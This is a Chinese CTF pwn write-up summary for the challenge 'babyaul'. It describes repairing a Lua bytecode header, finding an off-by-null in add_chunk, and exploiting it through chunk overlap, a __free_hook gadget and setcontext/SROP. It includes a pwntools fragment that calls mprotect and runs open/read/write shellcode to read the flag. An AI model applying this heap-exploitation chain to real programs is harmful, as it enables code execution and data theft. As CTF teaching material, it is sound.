# babyaul

> 分类：Pwn

## 题目描述

Lua 字节码（bins 文件），文件头被修改，修复后可正常运行。add_chunk 中花指令混淆，实际存在 off-by-null。

## 考察知识点

- Lua 字节码文件头修复
- off-by-null 漏洞
- 堆叠利用（伪造双向链表、向前合并、overlap）
- 劫持 free_hook（setcontext + orw）

## 解法

1. 修复 lua 字节码文件头后正常运行。
2. `add_chunk` 中花指令混淆，实际存在 off-by-null（size & 0xf = 8，inuse = 0）。
3. 伪造双向链表，向前合并造成 overlap，劫持 free_hook 为 gadget：

```
mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
```

4. 用 setcontext 做 SROP，mprotect 改堆权限，执行 orw shellcode 读 flag：

```python
free_hook = libc_base + libc.sym['__free_hook']
setcontext = libc_base + libc.sym['setcontext'] + 61
mprotect = libc_base + libc.sym['mprotect']

sig = SigreturnFrame()
sig.rip = mprotect
sig.rdi = (heap_addr+0xd4f0) & (~0xfff)
sig.rsi = 0x2000
sig.rdx = 7
sig.rsp = heap_addr + 0xd4f0 + 0xf8

shellcode = shellcraft.open('flag', 0)
shellcode += shellcraft.read('rax', heap_addr+0xd4f0, 0x50)
shellcode += shellcraft.write('1', heap_addr+0xd4f0, 0x50)
```

（完整 exp 见原 writeup）

## 参考答案

（flag 通过 off-by-null 堆利用 + setcontext orw 读取）

## 来源

- 作者：C4oy1Zz | https://cn-sec.com/archives/1802791.html
